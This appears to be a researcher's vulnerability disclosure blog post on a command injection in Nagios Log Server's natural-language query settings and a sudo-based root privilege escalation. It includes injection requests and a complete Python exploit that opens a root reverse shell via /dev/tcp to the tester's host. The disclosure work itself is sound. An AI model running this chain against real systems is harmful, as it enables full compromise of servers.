---
title: CVE-2025-34322 and CVE-2025-34323 - Rooting Nagios Log Server with AI! Just kidding, not really... Just an AI adjacent command injection.
layout: posts
---
## Overview

I did a quick glance over Nagios Log server a couple months ago and wanted to share two vulnerabilities I reported. The authenticated command injection is kinda fun as it was in some AI functionality added in via a python script, and then the privilege escalation was due to some directory permissions that allow you to control a file that executes as root via `sudo`. 
### Authenticated Command Injection
Nagios Log Server is vulnerable to an authenticated command injection vulnerability in the `Natural Language Queries` experimental functionality. This functionality appears to enable various [Large Language Models](https://en.wikipedia.org/wiki/Large_language_model) to assist in log file queries/interpretation. This appears to be accomplished using a python script that is invoked via `shell_exec()`. To enable this functionality, a selection is made within the `Global Settings` and, depending on which selection, various inputs are requested such as an API key, server IP/hostname, and port. These values are not checked for special characters. When leveraging the `Natural Language Queries` functionality via `/nagioslogserver/dashboard/natural_language_to_query` endpoint, these values pulled from the running configuration and leveraged in a formatted string without being escaped or checked, which is then passed to `shell_exec()`. This results in shell command execution as the `www-data` user.

### Privilege escalation
The `www-data` user can execute various commands and scripts as `root` without a password. Three of these scripts are located within a directory where the `www-data` has write access by way of being in the `nagios` user group. This group has write access, therefore they can move (not modify) files owned by root and create new files within the directory. Therefore, the `www-data` user can move files that the `www-data` user has sudo execution rights as to another name (example would be `mv reconfigure_ncpa.sh reconfigure_ncpa.sh.bak`), and then create any arbitrary file in its place, allowing the `www-data` user to execute the new file containing arbitrary commands as the `root` user.

## Technical Details

### 1. Authenticated Command Injection in Natural Language Queries in Nagios Log Server

The `Natural Language Queries` is a `Experimental Features` that can be located under the `Global Settings` section. To stay focused on the vulnerable code, we will focus on the vulnerability sink below, and then discuss from there how the settings play into this vulnerability.

To perform a query using `Natural Language Queries` after it is enabled, users would make the following request:

- `http://<nagios-logserver-url>/nagioslogserver/dashboard/natural_language_to_query?query=doesntmatter`

This can be observed in the code base as:
- `http://<nagios-logserver-url>/nagioslogserver/<controller>/<public-function>?query=doesntmatter`

Controllers are located at the following path:
- `/var/www/html/nagioslogserver/application/controllers/`

Below, we can follow what happens when this URL is requested:

```
# cat /var/www/html/nagioslogserver/application/controllers/Dashboard.php -n
     1	<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
     2	
     3	class Dashboard extends LS_Controller
     4	{
     5	    private $offset = 0;
     6	
     7	    function __construct()
     8	    {
     9	        parent::__construct();
    10	
    11	        // Make sure that user is authenticated no matter what page they are on
    12	        require_install();
...Omitted for brevity...
   390	
   391	    public function natural_language_to_query() {
   392	        $input = isset($_GET['input']) ? $_GET['input'] : '';
   393	        $input = escapeshellarg($input);
   394	        $current_fields = isset($_GET['current_fields']) ? $_GET['current_fields'] : '';
   395	        $current_fields = escapeshellarg($current_fields);
   396	    
   397	        $api_key = trim(get_option("ai_api_key"));
   398	        $model = trim(get_option("ai_provider"));
   399	        $self_host_ip_address = trim(get_option("self_host_ip_address"));
   400	        $self_host_port = trim(get_option("ai_port"));
   401	        
   402	        $script =  '/usr/local/nagioslogserver/scripts/generate_log_query.py';
   403	    
   404	        if ($model == "self_hosted") {
   405	            $command = "python3.9 $script --model \"$model\" --provider_address \"$self_host_ip_address\" --provider_port \"$self_host_port\" --natural_language_query \"$input\" --current_fields \"$current_fields\"";
   406	        } else {
   407	            $command = "python3.9 $script --api_key \"$api_key\" --model \"$model\" --natural_language_query \"$input\" --current_fields \"$current_fields\"";
   408	        }
   409	    
   410	        $output = shell_exec($command);

```
In the code above, the function `natural_language_to_query()` is invoked when `http://<nagios-logserver-url>/nagioslogserver/dashboard/natural_language_to_query` is requested. We can see `$input` is set via an HTTP `GET` parameter. It is then escaped using the PHP function `escapeshellarg()`, therefore that is likely not going to be vulnerable to command injection, though argument injection in the `generate_log_query.py` is a possibility. We won't be exploring that here though.

The exact same logic is true for the next two lines with the `$current_fields` parameter.

The interesting part starts with these lines of code:
```
   397	        $api_key = trim(get_option("ai_api_key"));
   398	        $model = trim(get_option("ai_provider"));
   399	        $self_host_ip_address = trim(get_option("self_host_ip_address"));
   400	        $self_host_port = trim(get_option("ai_port"));
```

After those values are pulled from the configuration using the `get_option()`, the `$script` variable is set to a python script `/usr/local/nagioslogserver/scripts/generate_log_query.py`.

Finally, we reach the sink. We use a self-hosted AI model `self_hosted` (there does not actually need to be one) which creates the following command string:
```
$command = "python3.9 $script --model \"$model\" --provider_address \"$self_host_ip_address\" --provider_port \"$self_host_port\" --natural_language_query \"$input\" --current_fields \"$current_fields\"";
```

This command string is passed to `shell_exec()` which executes the command.

Each of the parameters can be injected into using command substitution such as:
```
`id`
```

However, in order to inject into these parameters, we need to do so by setting configuration values in the `Global Settings` page. So, this exploit requires two requests:
1. Set the configuration values
2. Make the request to invoke the Natural Language query

The first, injecting a command into `self_hosted` will look like:
```
$ curl -isk -H 'Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; ls_session=3pap795eohmorm726nsnasvsgc1as9ou' --data 'csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d&natural_language_query=1&nlp_disclaimer=on&ai_provider=self_hosted&self_host_ip_address=`id>/var/www/html/nagioslogserver/www/scripts/test.txt`&ai_port=8000&saveglobals=1' http://192.168.122.198/nagioslogserver/admin/globals --proxy http://127.0.0.1:8080
HTTP/1.1 200 OK
Date: Sun, 07 Sep 2025 15:53:22 GMT
Server: Apache/2.4.65 (Debian)
Set-Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; expires=Sun, 07 Sep 2025 17:53:22 GMT; Max-Age=7200; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 96046

<!DOCTYPE html><!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7">
<![endif]--><!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8">
...Omitted for brevity...
```
It's important to note, this can easily be accomplished via the dashboard as well at `http://<nagios-logserver-url>/nagioslogserver/admin/globals`. One would just enter the injected command:
```
`id>/var/www/html/nagioslogserver/www/scripts/test.txt`
```
into the `Server Address` field and then save. This is true for any of the fields.

Next, invoking the Natural Language Query will look like:
```
$ curl -isk -H 'Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; ls_session=3pap795eohmorm726nsnasvsgc1as9ou' http://192.168.122.198/nagioslogserver/dashboard/natural_language_to_query --proxy http://127.0.0.1:8080
HTTP/1.1 200 OK
Date: Sun, 07 Sep 2025 15:59:44 GMT
Server: Apache/2.4.65 (Debian)
Set-Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; expires=Sun, 07 Sep 2025 17:59:44 GMT; Max-Age=7200; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 67
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"query":"Error: Model self_hosted not supported.","is_valid":true}
```
This request is what executes the injected command. We can ignore the error as it still executes. Because we redirected output to `/var/www/html/nagioslogserver/www/scripts/test.txt`, we can retrieve the output without authentication with the following curl command:
```
$ curl -sk http://192.168.122.198/nagioslogserver/scripts/test.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios)
```
We can see successful command execution as the `www-data` user, with an interesting note that the `www-data` user is a member of the `nagios` group. More on that in the next section.

Python script for this exploit available here: [CVE-2025-34322.txt](/exploits/CVE-2025-34322.txt)

### 2. Privilege Escalation via sudo rules with group writable directory

Using the previous command injection, we can enumerate sudo rules that can be run without a password as the `www-data` user:
```
$ curl -s -H 'Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; ls_session=3pap795eohmorm726nsnasvsgc1as9ou' --data 'csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d&natural_language_query=1&nlp_disclaimer=on&ai_provider=self_hosted&self_host_ip_address=`sudo -l>/var/www/html/nagioslogserver/www/scripts/test.txt`&ai_port=8000&saveglobals=1' http://192.168.122.198/nagioslogserver/admin/globals --proxy http://127.0.0.1:8080 -o /dev/null
$ curl -s -H 'Cookie: csrf_ls=8f053ed2cb80988cea42d3ae3fc4415d; ls_session=3pap795eohmorm726nsnasvsgc1as9ou' http://192.168.122.198/nagioslogserver/dashboard/natural_language_to_query --proxy http://127.0.0.1:8080 -o /dev/null
$ curl -sk http://192.168.122.198/nagioslogserver/scripts/test.txt
Matching Defaults entries for www-data on debian-nagios-logserver2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on debian-nagios-logserver2:
    (root) NOPASSWD: /etc/init.d/logstash start
    (root) NOPASSWD: /etc/init.d/logstash stop
    (root) NOPASSWD: /etc/init.d/logstash restart
    (root) NOPASSWD: /etc/init.d/logstash reload
    (root) NOPASSWD: /etc/init.d/logstash status
    (root) NOPASSWD: /etc/init.d/opensearch start
    (root) NOPASSWD: /etc/init.d/opensearch stop
    (root) NOPASSWD: /etc/init.d/opensearch restart
    (root) NOPASSWD: /etc/init.d/opensearch reload
    (root) NOPASSWD: /etc/init.d/opensearch status
    (root) NOPASSWD: /usr/bin/systemctl start opensearch
    (root) NOPASSWD: /usr/bin/systemctl stop opensearch
    (root) NOPASSWD: /usr/bin/systemctl restart opensearch
    (root) NOPASSWD: /usr/bin/systemctl reload opensearch
    (root) NOPASSWD: /usr/bin/systemctl status opensearch
    (root) NOPASSWD: /usr/bin/systemctl start logstash
    (root) NOPASSWD: /usr/bin/systemctl stop logstash
    (root) NOPASSWD: /usr/bin/systemctl restart logstash
    (root) NOPASSWD: /usr/bin/systemctl reload logstash
    (root) NOPASSWD: /usr/bin/systemctl status logstash
    (root) NOPASSWD: /usr/bin/systemctl start httpd
    (root) NOPASSWD: /usr/bin/systemctl stop httpd
    (root) NOPASSWD: /usr/bin/systemctl restart httpd
    (root) NOPASSWD: /usr/bin/systemctl reload httpd
    (root) NOPASSWD: /usr/bin/systemctl status httpd
    (nagios) NOPASSWD: /usr/local/nagioslogserver/logstash/bin/logstash
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/get_logstash_ports.sh
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/profile.sh
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh
    (root) NOPASSWD: /etc/init.d/ncpa start
    (root) NOPASSWD: /etc/init.d/ncpa stop
    (root) NOPASSWD: /etc/init.d/ncpa restart
    (root) NOPASSWD: /etc/init.d/ncpa reload
    (root) NOPASSWD: /etc/init.d/ncpa status
    (root) NOPASSWD: /usr/bin/systemctl start ncpa
    (root) NOPASSWD: /usr/bin/systemctl stop ncpa
    (root) NOPASSWD: /usr/bin/systemctl restart ncpa
    (root) NOPASSWD: /usr/bin/systemctl reload ncpa
    (root) NOPASSWD: /usr/bin/systemctl status ncpa
    (root) NOPASSWD: /usr/bin/ln -s /etc/openldap/cacerts/*
        /etc/pki/ca-trust/source/anchors/
    (root) NOPASSWD: /usr/bin/ln -s /etc/ldap/certs/*
        /usr/local/share/ca-certificates
    (root) NOPASSWD: /usr/bin/update-ca-trust extract
    (root) NOPASSWD: /usr/bin/update-ca-trust enable
    (root) NOPASSWD: /usr/bin/update-ca-certificates
    (root) NOPASSWD: /usr/sbin/update-ca-certificates
```

These three seem interesting:
```
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/get_logstash_ports.sh
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/profile.sh
    (root) NOPASSWD: /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh
```

By checking the `/usr/local/nagioslogserver/scripts` directory permissions, we observe that any `nagios` group member has write access to this directory:
```
# sudo -u www-data bash
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ cd ..
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver$ pwd
/usr/local/nagioslogserver
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver$ ls -lah
total 44K
drwxrwxr-x 11 nagios nagios   4.0K Sep  7 16:34 .
drwxr-xr-x 12 root   root     4.0K Sep  7 16:29 ..
drwxrwxr-x  4 nagios nagios   4.0K Sep  7 16:20 etc
-rw-r--r--  1 root   root        0 Sep  7 16:34 .installed
drwxr-xr-x 14 nagios nagios   4.0K Sep  7 16:29 logstash
drwxrwxr-x  2 nagios nagios   4.0K Sep  7 16:20 mibs
drwxr-xr-x 12 nagios nagios   4.0K Sep  7 16:20 opensearch
drwxrwxr-x  5 nagios nagios   4.0K Sep  7 16:20 pythonvenv
drwxrwxr-x  3 nagios nagios   4.0K Sep  7 16:20 scripts
drwxrwxr-x  2 nagios nagios   4.0K Sep  7 16:36 snapshots
drwxrwxr-x  3 nagios www-data 4.0K Sep  7 16:36 tmp
drwxrwxr-x  2 nagios nagios   4.0K Sep  7 16:31 var

```
Write access to this directory means that members of this group can move files inside this directory even if they do not have write access to the file itself. For example, if we list out files in this directory:
```
$ ls -lah
total 138M
drwxrwxr-x  3 nagios nagios 4.0K Sep  7 16:20 .
drwxrwxr-x 11 nagios nagios 4.0K Sep  7 16:34 ..
-r-xr-xr--  1 root   root   2.4K Sep  7 16:20 change_timezone.sh
-r-xr-xr--  1 nagios nagios 5.1K Sep  7 16:20 check_ai_key.sh
-r-xr-xr--  1 nagios nagios 2.3K Sep  7 16:20 create_backup.sh
-r-xr-xr--  1 nagios nagios 3.8K Sep  7 16:20 dump_index.php
-r-xr-xr--  1 nagios nagios 137M Sep  7 16:20 elasticdump
dr-xr-xr--  2 nagios nagios 4.0K Sep  7 16:20 esdump
-r-xr-xr--  1 nagios nagios 8.3K Sep  7 16:20 generate_log_query.py
-r-xr-xr--  1 nagios nagios 1.2K Sep  7 16:20 generate_uuid.sh
-r-xr-xr--  1 nagios nagios 2.1K Sep  7 16:20 get_es_config.php
-r-xr-xr--  1 nagios nagios  722 Sep  7 16:20 get_logstash_config.php
-r-xr-xr--  1 root   root     85 Sep  7 16:20 get_logstash_ports.sh
-r-xr-xr--  1 nagios nagios 2.4K Sep  7 16:20 index_data_helper.php
-r-xr-xr--  1 nagios nagios  33K Sep  7 16:20 migrate_data.php
-r-xr-xr--  1 root   root    87K Sep  7 16:20 profile.sh
-r-xr-xr--  1 nagios nagios 1.5K Sep  7 16:20 reconfigure_ncpa.php
-r-xr-xr--  1 root   root    316 Sep  7 16:20 reconfigure_ncpa.sh
-r-xr-xr--  1 nagios nagios 1.9K Sep  7 16:20 reset_nagiosadmin_password.sh
-r-xr-xr--  1 nagios nagios 4.1K Sep  7 16:20 restore_backup.sh
-r-xr-xr--  1 nagios nagios  50K Sep  7 16:20 xi_api_create_passive_objects.php
```
The files that `www-data` has permission to execute as `root` via `sudo` are all owed by root. `www-data` can move the `reconfigure_ncpa.sh` to any other filename and then create a new `reconfigure_ncpa.sh` file, set the executable bit, and then run as `root` via `sudo`.

Writing to the file clearly does not work as `www-data` as shown by the first line of output, however moving and recreating a new file does:
```
root@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts# sudo -u www-data bash
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ echo 'id' >> reconfigure_ncpa.sh 
bash: reconfigure_ncpa.sh: Permission denied
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ mv reconfigure_ncpa.sh reconfigure_ncpa.sh.bak
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ echo 'id' >> reconfigure_ncpa.sh 
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ chmod +x reconfigure_ncpa.sh
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ sudo /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh
uid=0(root) gid=0(root) groups=0(root)
www-data@debian-nagios-logserver2:/usr/local/nagioslogserver/scripts$ cat reconfigure_ncpa.sh
id
```
## Proof of Concept
Combining these, we can use the following script to exploit the command injection, perform the file move operations, and then execute the new file via `sudo` to get a reverse shell as `root`:

First, start a `nc` listener in a separate terminal window:
```
$ nc -nlvp 1234
listening on [any] 1234 ...
```
Next, get the local IP address of your testing machine, ours is `192.168.122.216`.

Finally, leverage the proof of concept below to execute a reverse shell back to your testing machine as the root user:
```
$ python3 root_exploit.py http://192.168.122.198/ nagiosadmin password123 192.168.122.216 1234
[+] Login worked, adding command injection to self_host_ip_address
[*] Triggering command with request to natural language query endpoint http://192.168.122.198/nagioslogserver/dashboard/natural_language_to_query

```
And observe a reverse shell connecting back to the separate terminal window:
```
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.122.216] from (UNKNOWN) [192.168.122.198] 50260
bash: cannot set terminal process group (23645): Inappropriate ioctl for device
bash: no job control in this shell
root@debian-nagios-logserver2:/var/www/html/nagioslogserver/www# id
id
uid=0(root) gid=0(root) groups=0(root)
```
`root_exploit.py` contents:
```
import requests
import sys
import base64

## Usage
# $ python3 root_exploit.py <nagios-logserver-url> <username> <password> <local-ip> <local-port>

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
local_ip = sys.argv[4]
local_port = sys.argv[5]

proxies = dict.fromkeys(['http','https'],'http://127.0.0.1:8080')

login_url = f'{host}nagioslogserver/login'
globals_setting_url = f'{host}nagioslogserver/admin/globals'
nlq_url = f'{host}nagioslogserver/dashboard/natural_language_to_query'
get_output = f'{host}nagioslogserver/scripts/test.txt'

# reverse shell, can replace with any command Ex: `id>/var/www/html/nagioslogserver/www/scripts/test.txt` if you just want to see `root` run a command and get the output from the webserver
## `nc -nlvp <local_port>` to listen for incoming connection

root_command = f"""bash -c '(bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1)&';
cp /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh.bak /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh;
chown root:root /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh"""
root_command_b64 = base64.b64encode(root_command.encode()).decode()

privesc_shell_script = f"""mv /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh.bak;
echo '{root_command_b64}' |base64 -d > /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh;
chmod +x /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh;
sleep 1;
sudo /usr/local/nagioslogserver/scripts/reconfigure_ncpa.sh;
"""

base64_cmd = base64.b64encode(privesc_shell_script.encode()).decode()

cmd = f"echo {base64_cmd}|base64 -d|bash"


with requests.Session() as s:
    s.proxies.update(proxies)
    s.verify = False

    csrf_req = s.get(login_url)
    csrf_ls = csrf_req.cookies['csrf_ls']
    
    login_payload = {
        'csrf_ls': csrf_ls,
        'username': username,
        'password': password
    }
    login_req = s.post(login_url, data=login_payload, allow_redirects=False)
    if 'ls_session' not in login_req.cookies:
        print("[-] Incorrect credentials")
        exit()
    
    print(f"[+] Login worked, adding command injection to self_host_ip_address")


    cmd_injection_payload = {
        "csrf_ls": csrf_ls,
        "natural_language_query": 1,
        "nlp_disclaimer": "on",
        "ai_provider": "self_hosted",
        "self_host_ip_address": f"`{cmd}`",
        "ai_port": 8000,
        "saveglobals":1
    }
    cmd_injection_res = s.post(globals_setting_url, data=cmd_injection_payload)

    if not cmd_injection_res.ok:
        print(f"[-] Cmd injection probably didn't work")
        exit()
    if cmd not in cmd_injection_res.text:
        print(f"[*] Command didn't show up in the response text, still check if it works...")
    
    print(f"[*] Triggering command with request to natural language query endpoint {nlq_url}")

    nlq_res = s.get(nlq_url)

    if not nlq_res.ok:
        print(f"[-] Something failed requesting {nlq_url}, check {get_output} for cmd output")

```
Also available here: [root_exploit.txt](/exploits/nagios_log_server_root_nlq_exploit.txt)

#### All exploits also available in this repository: 
`https://github.com/mcorybillington/CVE-2025-34322_CVE-2025-34323_Nagios_Log_Server`
